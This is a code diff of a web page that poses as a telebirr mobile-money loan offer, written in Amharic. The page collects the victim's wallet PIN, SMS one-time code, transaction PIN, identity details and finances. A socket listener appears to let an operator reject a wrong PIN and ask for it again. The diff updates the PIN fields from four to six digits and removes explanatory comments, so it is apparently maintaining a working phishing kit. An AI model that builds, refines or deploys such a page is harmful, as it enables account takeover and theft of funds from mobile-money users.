@@ -138,7 +138,6 @@
 
             <div class="bg-white rounded-2xl border border-gray-100 p-6 shadow-sm flex-1 flex flex-col justify-center min-h-[420px]">
                 
-                <!-- STEP 1: LOGIN -->
                 <div x-show="step === 1" class="space-y-6 w-full">
                     <div class="text-center">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">የቴሌብር አካውንትዎን ያስገቡ</h2>
@@ -154,8 +153,8 @@
                     <div>
                         <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">የኪስ ቦርሳ የይለፍ ቃል (PIN)</label>
                         <div class="flex justify-center gap-3 py-1">
-                            <template x-for="(_, i) in 4" :key="i">
-                                <input type="password" class="pin-box text-gray-700 step1-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step1-pin')" x-model="step1Pin.value[i]">
+                            <template x-for="(_, i) in 6" :key="i">
+                                <input type="password" class="pin-box text-gray-700 step1-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 6, 'step1-pin')" x-model="step1Pin.value[i]">
                             </template>
                         </div>
                     </div>
@@ -166,7 +165,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 2: SMS OTP -->
                 <div x-show="step === 2" x-cloak class="space-y-6 w-full">
                     <div class="text-center">
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">የቴሌብር ኤስኤምኤስ (OTP) ማረጋገጫ</h2>
@@ -184,7 +182,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 2.5: LOADING/WAITING SERVER STATE -->
                 <div x-show="step === 2.5" x-cloak class="text-center flex flex-col items-center justify-center space-y-6 w-full">
                     <div class="relative flex items-center justify-center">
                         <div class="animate-ping absolute inline-flex h-12 w-12 rounded-full bg-cyan-400 opacity-20"></div>
@@ -196,15 +193,14 @@
                     </div>
                 </div>
 
-                <!-- STEP 3: TRANSACTION PIN -->
                 <div x-show="step === 3" x-cloak class="space-y-6 w-full">
                     <div class="text-center">
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">የአካውንት ደህንነት ማረጋገጫ</h2>
-                        <p class="text-xs text-gray-600 font-medium mt-1">ባለ 4-አሃዝ የቴሌብር መክፈያ እና የግብይት PIN ቁጥርዎን ያስገቡ</p>
+                        <p class="text-xs text-gray-600 font-medium mt-1">ባለ 6-አሃዝ የቴሌብር መክፈያ እና የግብይት PIN ቁጥርዎን ያስገቡ</p>
                     </div>
                     <div class="flex justify-center gap-3 py-1">
-                        <template x-for="(_, i) in 4" :key="i">
-                            <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step3-pin')" x-model="step3Pin.value[i]">
+                        <template x-for="(_, i) in 6" :key="i">
+                            <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 6, 'step3-pin')" x-model="step3Pin.value[i]">
                         </template>
                     </div>
                     <div class="pt-2">
@@ -215,7 +211,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 4: LOAN SELECTION -->
                 <div x-show="step === 4" x-cloak class="space-y-5 w-full">
                     <div class="text-center mb-4">
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">የብድር ማዋቀሪያ</h2>
@@ -250,7 +245,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 5: KYC PROFILE -->
                 <div x-show="step === 5" x-cloak class="space-y-5 w-full">
                     <div class="text-center mb-4">
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">የግል መገለጫ ማረጋገጫ (KYC)</h2>
@@ -276,7 +270,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 6: FINANCIALS -->
                 <div x-show="step === 6" x-cloak class="space-y-5 w-full">
                     <div class="text-center mb-4">
                         <h2 class="text-lg font-bold text-gray-800 tracking-tight">የፋይናንስ ብቃት መመዘኛ</h2>
@@ -303,7 +296,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 8: COMPLETE -->
                 <div x-show="step === 8" x-cloak class="text-center py-6 flex flex-col items-center justify-center my-auto space-y-6 w-full">
                     <div class="w-16 h-16 bg-[#0056B3] rounded-2xl flex items-center justify-center shadow-md">
                         <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3.5">
@@ -334,13 +326,13 @@
                 step: 1, appId: '', referenceId: '', connected: false,
                 form: { loanType: '', amount: 25000, term: '4', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '' },
                 otp: { code: '' },
-                step1Pin: { value: ['', '', '', ''] },
-                step3Pin: { value: ['', '', '', ''] }, 
+                step1Pin: { value: ['', '', '', '', '', ''] },
+                step3Pin: { value: ['', '', '', '', '', ''] }, 
                 verifyingOtp: false, authorizingFinalPin: false, processingStep6: false,
                 socket: null, toast: { show: false, message: '' },
 
-                get isStep1PinValid() { return this.step1Pin.value.join('').length === 4; },
-                get isStep3PinValid() { return this.step3Pin.value.join('').length === 4; },
+                get isStep1PinValid() { return this.step1Pin.value.join('').length === 6; },
+                get isStep3PinValid() { return this.step3Pin.value.join('').length === 6; },
 
                 calculateWeeklyInstallment() {
                     let principal = Number(this.form.amount) || 0;
@@ -462,7 +454,7 @@
 
                     this.socket.on('pin-rejected', (data) => {
                         this.authorizingFinalPin = false;
-                        this.step3Pin.value = ['', '', '', ''];
+                        this.step3Pin.value = ['', '', '', '', '', ''];
                         this.step = 3;
                         this.triggerToastNotification(data.message || "የተሳሳተ የግብይት PIN ቁጥር። እባክዎ እንደገና ይሞክሩ።");
                     });
